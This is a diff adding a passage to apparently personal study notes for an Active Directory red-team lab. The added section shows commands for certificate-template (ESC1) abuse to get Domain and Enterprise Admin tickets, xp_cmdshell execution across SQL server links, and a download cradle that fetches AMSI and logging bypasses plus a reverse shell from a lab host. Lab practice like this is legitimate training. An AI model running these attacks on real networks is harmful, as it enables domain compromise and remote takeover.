@@ -2587,3 +2587,323 @@ dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 > # Solution -:
 
 
+### **Enumerate Templates**
+
+
+- We can use the `Certify` tool to check for **AD CS** in `moneycorp`.
+
+
+```powershell
+C:\AD\Tools\Certify.exe cas
+```
+
+
+
+
+
+**_Important Output_**
+
+
+
+
+![](https://i.imgur.com/2sHEFFu.png)
+
+
+- We can list all the templates using the following command. Going through the output we can find some interesting templates
+
+
+```powershell
+C:\AD\Tools\Certify.exe find
+```
+
+
+
+
+**_Important Output_**
+
+
+
+
+![](https://i.imgur.com/X39odqU.png)
+
+
+
+> [!note] The template "`HTTPSCertificates`" allows enrollment to the RDPUsers group, which we are able to access
+
+
+
+
+## **Privilege Escalation to DA and EA using `ESC1` The template**
+
+### **Domain Admin**
+
+
+
+- `HTTPSCertificates` looks interesting. Let's get some more information about it as it allows requestor to supply subject name:
+
+
+
+
+```powershell
+C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
+```
+
+
+
+
+**_important Output_**
+
+
+
+
+![](https://i.imgur.com/VJtq7Oe.png)
+
+
+
+
+
+
+> [!note] Sweet! The `HTTPSCertificates` template grants enrollment rights to `RDPUsers` group and allows requestor to supply Subject Name. Recall that `studentx` is a member of `RDPUsers` group. This means that we can request certificate for any user as `studentx` .
+
+
+- Request a certificate for Domain Admin - Administrator
+
+
+```powershell
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+```
+
+
+
+> [!note]
+>  Copy all the text between `-----BEGIN RSA PRIVATE KEY----- `and `-----END CERTIFICATE-----` and save it to `esc1.pem`.
+
+
+- Convert the obtained credentials to `PFX` format using the `openssl` binary on the student VM, using '`SecretPass`' as the export password.
+- Note that you have to type the password manually
+
+
+
+```powershell
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+```
+
+
+
+- Use the `PFX` created above with `Rubeus` to request a TGT for DA - Administrator!
+
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass /ptt
+```
+
+
+
+
+
+**_Example_**
+
+
+
+
+![](https://i.imgur.com/5UhVvcu.png)
+
+
+
+- Check if we actually have DA privileges now:
+
+
+```powershell
+winrs -r:dcorp-dc whoami
+```
+
+
+
+
+**_Example_**
+
+
+
+![](https://i.imgur.com/efsSAKN.png)
+
+
+
+### **Enterprise Admin**
+
+
+
+- We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator
+
+
+
+
+```powershell
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+```
+
+
+
+
+
+> [!note] 
+> Difference in `/altname`, Then go ahead and save the certificate and save it as `esc1-EA.pem`.
+
+
+
+
+
+
+- Now convert it to `PFX`. I will use `SecretPass` as the export password
+- Don't forget to type password manually
+
+
+```powershell
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
+```
+
+
+
+
+- Use `Rubeus` to request TGT for Enterprise Administrator - Administrator
+
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass /ptt
+```
+
+
+
+**_Example_**
+
+
+
+![](https://i.imgur.com/fj7iPVu.png)
+
+
+- Finally, access `mcop-dc` !!
+
+
+
+
+```powershell
+winrs -r:mcorp-dc cmd
+```
+
+
+
+
+**_Example_**
+
+
+
+![](https://i.imgur.com/bbr0YzC.png)
+
+
+
+> [!tip] To know how to do **Privilege Escalation to DA and EA using `ESC3` and `ESC6`**, Check Lab Manual, I only practiced it, but did not take notes, in the exam lab, make sure to refer to lab manual and check both of them
+
+
+
+
+
+
+> [!bug] **Learning Objective 22**
+> - Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+> # Solution -:
+
+
+**We start with enumerating SQL servers in the domain and if `studentx` has privileges to connect to any of them. We can use `PowerUpSQL` module for that**
+
+- Start up a session with `invisi-shell`
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+
+- Load `PowerUpSQl`
+
+
+```powershell
+Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+```
+
+
+
+
+- Now enumerate `SQL` servers
+
+
+
+
+```powershell
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+```
+
+
+
+![](https://i.imgur.com/4HTrzoo.png)
+
+
+- We can then use `Get-SQLServerLinkCrawl` for crawling the database links automatically
+
+
+
+
+
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+
+
+
+![](https://i.imgur.com/woeljrx.png)
+
+
+**Sweet! We have `sysadmin` set to `1` which means `True` on `eu-sql33` server!**
+
+
+- Let try to get command execution on `eu-sql33`
+
+
+```powershell
+# -Instance : the first sql instance
+# -Query : command to run
+# -QueryTarget : our target which has all condition met
+
+
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql33
+```
+
+
+
+**_Example Output_**
+
+
+
+![](https://i.imgur.com/AK0H9dV.png)
+
+
+
+- Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the `eu-sql33` instance. Remember to start a listener
+- Make sure to start your **HFS** first and upload the file `sbloggingbypass.txt`, `amsibypass.txt` and `Invoke-PowerShellTcpEx.ps1` in other to host them
+
+
+
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.5/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.5/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.5/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql33
+```
+
+
+
+
+**_Example Output_**
+
+
+
+
+![](https://i.imgur.com/JlCEJkl.png)
+
+
+
+
